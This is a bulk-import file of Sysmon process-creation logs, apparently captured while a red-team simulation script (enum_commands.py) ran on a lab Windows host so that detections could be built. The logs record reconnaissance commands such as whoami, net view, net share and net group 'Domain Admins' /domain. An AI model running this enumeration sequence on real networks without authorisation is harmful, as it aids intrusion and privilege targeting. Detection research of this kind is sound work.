{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"4l_z8WUBfVn9xHWivjtZ"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","Product":"Microsoft® Windows® Operating System","Hashes":"MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56","Description":"Net Command","ParentProcessGuid":"{2D3B23BE-4A74-5BA2-0000-00107B910D00}","UtcTime":"2018-09-19 13:09:11.919","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","Image":"C:\\Windows\\SysWOW64\\net.exe","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","Company":"Microsoft Corporation","ParentProcessId":"2304","ProcessId":"3540","TerminalSessionId":"1","IntegrityLevel":"Medium","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","CommandLine":"net start","ProcessGuid":"{2D3B23BE-4A77-5BA2-0000-001047EE0D00}"},"@timestamp":"2018-09-19T13:09:11.919Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:11.919\nProcessGuid: {2D3B23BE-4A77-5BA2-0000-001047EE0D00}\nProcessId: 3540\nImage: C:\\Windows\\SysWOW64\\net.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: net start\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56\nParentProcessGuid: {2D3B23BE-4A74-5BA2-0000-00107B910D00}\nParentProcessId: 2304\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"record_number":"1231","version":5,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"task":"Process Create (rule: ProcessCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"4V_z8WUBfVn9xHWivjtZ"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4A74-5BA2-0000-00107B910D00}","User":"flare-PC\\flare","LogonId":"0xe320","Hashes":"MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56","Description":"Net Command","UtcTime":"2018-09-19 13:09:11.919","Image":"C:\\Windows\\SysWOW64\\net.exe","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ParentProcessId":"2304","CommandLine":"net accounts","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","TerminalSessionId":"1","ProcessId":"1760","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","IntegrityLevel":"Medium","ProcessGuid":"{2D3B23BE-4A77-5BA2-0000-00109CF00D00}"},"@timestamp":"2018-09-19T13:09:11.919Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:11.919\nProcessGuid: {2D3B23BE-4A77-5BA2-0000-00109CF00D00}\nProcessId: 1760\nImage: C:\\Windows\\SysWOW64\\net.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: net accounts\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56\nParentProcessGuid: {2D3B23BE-4A74-5BA2-0000-00107B910D00}\nParentProcessId: 2304\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"type":"wineventlog","version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"host":{"name":"flare-PC"},"record_number":"1233","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"2F_z8WUBfVn9xHWivjtZ"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Betriebssystem Microsoft® Windows®","User":"flare-PC\\flare","ParentProcessGuid":"{2D3B23BE-4A74-5BA2-0000-00107B910D00}","Description":"whoami - Zeigt Informationen über angemeldete Benutzer an.","Hashes":"MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3","UtcTime":"2018-09-19 13:09:11.542","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","Company":"Microsoft Corporation","CommandLine":"whoami","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","TerminalSessionId":"1","ProcessId":"3924","IntegrityLevel":"Medium","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ParentProcessId":"2304","Image":"C:\\Windows\\SysWOW64\\whoami.exe","ProcessGuid":"{2D3B23BE-4A77-5BA2-0000-001046D50D00}"},"@timestamp":"2018-09-19T13:09:11.558Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:11.542\nProcessGuid: {2D3B23BE-4A77-5BA2-0000-001046D50D00}\nProcessId: 3924\nImage: C:\\Windows\\SysWOW64\\whoami.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: whoami - Zeigt Informationen über angemeldete Benutzer an.\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: whoami\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3\nParentProcessGuid: {2D3B23BE-4A74-5BA2-0000-00107B910D00}\nParentProcessId: 2304\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1222","event_id":1,"version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"host":{"name":"flare-PC"},"type":"wineventlog","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"2l_z8WUBfVn9xHWivjtZ"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:09:11.871","Image":"C:\\Windows\\SysWOW64\\net.exe","Hashes":"MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56","Description":"Net Command","Product":"Microsoft® Windows® Operating System","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentProcessGuid":"{2D3B23BE-4A74-5BA2-0000-00107B910D00}","Company":"Microsoft Corporation","TerminalSessionId":"1","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"net view","IntegrityLevel":"Medium","ParentProcessId":"2304","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","ProcessId":"2748","ProcessGuid":"{2D3B23BE-4A77-5BA2-0000-0010D4EC0D00}"},"@timestamp":"2018-09-19T13:09:11.871Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:11.871\nProcessGuid: {2D3B23BE-4A77-5BA2-0000-0010D4EC0D00}\nProcessId: 2748\nImage: C:\\Windows\\SysWOW64\\net.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: net view\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56\nParentProcessGuid: {2D3B23BE-4A74-5BA2-0000-00107B910D00}\nParentProcessId: 2304\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1230","task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"version":5,"event_id":1,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"3F_z8WUBfVn9xHWivjtZ"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4A77-5BA2-0000-0010CCF50D00}","Product":"Microsoft® Windows® Operating System","UtcTime":"2018-09-19 13:09:12.001","Image":"C:\\Windows\\SysWOW64\\net1.exe","LogonId":"0xe320","User":"flare-PC\\flare","Description":"Net Command","ParentImage":"C:\\Windows\\SysWOW64\\net.exe","ParentCommandLine":"net group","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"C:\\Windows\\system32\\net1 group","ParentProcessId":"2348","TerminalSessionId":"1","ProcessId":"900","IntegrityLevel":"Medium","Company":"Microsoft Corporation","Hashes":"MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessGuid":"{2D3B23BE-4A78-5BA2-0000-0010C3F60D00}"},"@timestamp":"2018-09-19T13:09:12.001Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:12.001\nProcessGuid: {2D3B23BE-4A78-5BA2-0000-0010C3F60D00}\nProcessId: 900\nImage: C:\\Windows\\SysWOW64\\net1.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\net1 group\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347\nParentProcessGuid: {2D3B23BE-4A77-5BA2-0000-0010CCF50D00}\nParentProcessId: 2348\nParentImage: C:\\Windows\\SysWOW64\\net.exe\nParentCommandLine: net group","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"task":"Process Create (rule: ProcessCreate)","version":5,"host":{"name":"flare-PC"},"record_number":"1238","user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"3V_z8WUBfVn9xHWivjtZ"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:09:12.064","Hashes":"MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347","Image":"C:\\Windows\\SysWOW64\\net1.exe","Description":"Net Command","Product":"Microsoft® Windows® Operating System","ParentImage":"C:\\Windows\\SysWOW64\\net.exe","ParentCommandLine":"net share","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","TerminalSessionId":"1","CommandLine":"C:\\Windows\\system32\\net1 share","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ProcessId":"3848","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ParentProcessId":"3144","IntegrityLevel":"Medium","ParentProcessGuid":"{2D3B23BE-4A78-5BA2-0000-00101DFA0D00}","ProcessGuid":"{2D3B23BE-4A78-5BA2-0000-001014FB0D00}"},"@timestamp":"2018-09-19T13:09:12.064Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:12.064\nProcessGuid: {2D3B23BE-4A78-5BA2-0000-001014FB0D00}\nProcessId: 3848\nImage: C:\\Windows\\SysWOW64\\net1.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\net1 share\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347\nParentProcessGuid: {2D3B23BE-4A78-5BA2-0000-00101DFA0D00}\nParentProcessId: 3144\nParentImage: C:\\Windows\\SysWOW64\\net.exe\nParentCommandLine: net share","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1242","type":"wineventlog","host":{"name":"flare-PC"},"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"event_id":1,"version":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"31_z8WUBfVn9xHWivjtZ"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-45CB-5BA2-0000-001032770000}","LogonId":"0x3e5","User":"NT-AUTORITÄT\\LOKALER DIENST","Image":"C:\\Windows\\SysWOW64\\wbem\\WmiPrvSE.exe","Description":"WMI Provider Host","Product":"Microsoft® Windows® Operating System","UtcTime":"2018-09-19 13:09:12.207","ParentImage":"C:\\Windows\\System32\\svchost.exe","ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch","FileVersion":"10.0.14409.1005 (rs1_srvoob.161208-1155)","Company":"Microsoft Corporation","TerminalSessionId":"0","ParentProcessId":"620","ProcessId":"3708","CommandLine":"C:\\Windows\\sysWOW64\\wbem\\wmiprvse.exe -secured -Embedding","IntegrityLevel":"System","CurrentDirectory":"C:\\Windows\\system32\\","LogonGuid":"{2D3B23BE-45CB-5BA2-0000-0020E5030000}","Hashes":"MD5=54B7C43C2E89F5CE71B2C255C1CF35E2,SHA256=E56A124BFC0D46F76BE850F8E599B9F69E1BC1F2152E304BBF496C414A458AD1","ProcessGuid":"{2D3B23BE-4A78-5BA2-0000-0010DB040E00}"},"@timestamp":"2018-09-19T13:09:12.207Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:12.207\nProcessGuid: {2D3B23BE-4A78-5BA2-0000-0010DB040E00}\nProcessId: 3708\nImage: C:\\Windows\\SysWOW64\\wbem\\WmiPrvSE.exe\nFileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155)\nDescription: WMI Provider Host\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\sysWOW64\\wbem\\wmiprvse.exe -secured -Embedding\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT-AUTORITÄT\\LOKALER DIENST\nLogonGuid: {2D3B23BE-45CB-5BA2-0000-0020E5030000}\nLogonId: 0x3e5\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: MD5=54B7C43C2E89F5CE71B2C255C1CF35E2,SHA256=E56A124BFC0D46F76BE850F8E599B9F69E1BC1F2152E304BBF496C414A458AD1\nParentProcessGuid: {2D3B23BE-45CB-5BA2-0000-001032770000}\nParentProcessId: 620\nParentImage: C:\\Windows\\System32\\svchost.exe\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k DcomLaunch","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"record_number":"1246","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"type":"wineventlog","version":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"7F_z8WUBfVn9xHWivjtc"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4A77-5BA2-0000-001047EE0D00}","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:09:11.919","Image":"C:\\Windows\\SysWOW64\\net1.exe","Description":"Net Command","Hashes":"MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347","Product":"Microsoft® Windows® Operating System","ParentImage":"C:\\Windows\\SysWOW64\\net.exe","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","LogonId":"0xe320","Company":"Microsoft Corporation","CommandLine":"C:\\Windows\\system32\\net1 start","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"2564","ParentProcessId":"3540","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ParentCommandLine":"net start","TerminalSessionId":"1","IntegrityLevel":"Medium","ProcessGuid":"{2D3B23BE-4A77-5BA2-0000-00103EEF0D00}"},"@timestamp":"2018-09-19T13:09:11.919Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:11.919\nProcessGuid: {2D3B23BE-4A77-5BA2-0000-00103EEF0D00}\nProcessId: 2564\nImage: C:\\Windows\\SysWOW64\\net1.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\net1 start\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347\nParentProcessGuid: {2D3B23BE-4A77-5BA2-0000-001047EE0D00}\nParentProcessId: 3540\nParentImage: C:\\Windows\\SysWOW64\\net.exe\nParentCommandLine: net start","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1232","type":"wineventlog","host":{"name":"flare-PC"},"event_id":1,"version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"7l_z8WUBfVn9xHWivjtc"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:09:12.033","Hashes":"MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347","Description":"Net Command","Image":"C:\\Windows\\SysWOW64\\net1.exe","ParentProcessGuid":"{2D3B23BE-4A78-5BA2-0000-0010E4F70D00}","ParentImage":"C:\\Windows\\SysWOW64\\net.exe","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","CommandLine":"C:\\Windows\\system32\\net1 group \"Domain Admins\" /domain","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3340","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","IntegrityLevel":"Medium","ParentCommandLine":"net group \"Domain Admins\" /domain","TerminalSessionId":"1","ParentProcessId":"2392","ProcessGuid":"{2D3B23BE-4A78-5BA2-0000-0010DBF80D00}"},"@timestamp":"2018-09-19T13:09:12.033Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:12.033\nProcessGuid: {2D3B23BE-4A78-5BA2-0000-0010DBF80D00}\nProcessId: 3340\nImage: C:\\Windows\\SysWOW64\\net1.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\net1 group \"Domain Admins\" /domain\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347\nParentProcessGuid: {2D3B23BE-4A78-5BA2-0000-0010E4F70D00}\nParentProcessId: 2392\nParentImage: C:\\Windows\\SysWOW64\\net.exe\nParentCommandLine: net group \"Domain Admins\" /domain","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1240","event_id":1,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"version":5,"type":"wineventlog","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"71_z8WUBfVn9xHWivjtc"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4A78-5BA2-0000-001058FC0D00}","Product":"Microsoft® Windows® Operating System","UtcTime":"2018-09-19 13:09:12.111","LogonId":"0xe320","Image":"C:\\Windows\\SysWOW64\\net1.exe","Hashes":"MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347","User":"flare-PC\\flare","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"net config workstation","ParentImage":"C:\\Windows\\SysWOW64\\net.exe","Company":"Microsoft Corporation","CommandLine":"C:\\Windows\\system32\\net1 config workstation","ParentProcessId":"3644","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3424","IntegrityLevel":"Medium","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","Description":"Net Command","TerminalSessionId":"1","ProcessGuid":"{2D3B23BE-4A78-5BA2-0000-00104FFD0D00}"},"@timestamp":"2018-09-19T13:09:12.111Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:12.111\nProcessGuid: {2D3B23BE-4A78-5BA2-0000-00104FFD0D00}\nProcessId: 3424\nImage: C:\\Windows\\SysWOW64\\net1.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\net1 config workstation\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347\nParentProcessGuid: {2D3B23BE-4A78-5BA2-0000-001058FC0D00}\nParentProcessId: 3644\nParentImage: C:\\Windows\\SysWOW64\\net.exe\nParentCommandLine: net config workstation","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"record_number":"1244","version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"host":{"name":"flare-PC"},"task":"Process Create (rule: ProcessCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"tV_z8WUBfVn9xHWikjtq"}}
